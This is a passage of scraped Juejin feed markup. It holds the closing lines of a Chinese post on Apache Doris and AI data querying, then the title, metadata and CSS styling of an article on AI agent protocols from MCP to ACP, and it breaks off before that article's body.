<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b6eaf3aaffb4547a9d65f846828601e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=zrrUhDp2OmFLsvzZ%2BnT7Gwe1cOE%3D" alt="六、结束语-1.png" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/110d14815c8b486dbe50dde8abb3ca98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=13GCCMEdVlfD%2FhNnQmShhSsD4qg%3D" alt="六、结束语.png" loading="lazy"/></p>
<p>未来，我们还会在 DATA + AI 上继续探索，搭建更加完善的企业 AI 问数架构。此外，我们将保持与 Doris 开源社区的紧密联系保持联系，积极参与共建并为社区提供反馈。</p>
<p>欢迎更多的同仁加入 AI 能力共创中来，可通过下方二维码添加 Doris 小助手，回复【AI】即可加入 AI 专项交流群。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88f9e91d41684893bdad7579c96f4fa4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835740&amp;x-signature=oh9r9BDgNGmrhstZ5EyTjxSWHng%3D" alt="Doris AI 专项群二维码" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agent 协议演进：从 MCP 到 ACP 的架构对比与未来展望]]></title>    <link>https://juejin.cn/post/7577031454585929755</link>    <guid>https://juejin.cn/post/7577031454585929755</guid>    <pubDate>2025-11-27T08:12:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577031454585929755" data-draft-id="7576918517238218802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agent 协议演进：从 MCP 到 ACP 的架构对比与未来展望"/> <meta itemprop="keywords" content="MCP,Gemini,OpenAI"/> <meta itemprop="datePublished" content="2025-11-27T08:12:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="魁首"/> <meta itemprop="url" content="https://juejin.cn/user/3817931570691031"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agent 协议演进：从 MCP 到 ACP 的架构对比与未来展望
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817931570691031/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    魁首
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:12:52.000Z" title="Thu Nov 27 2025 08:12:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读26分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body 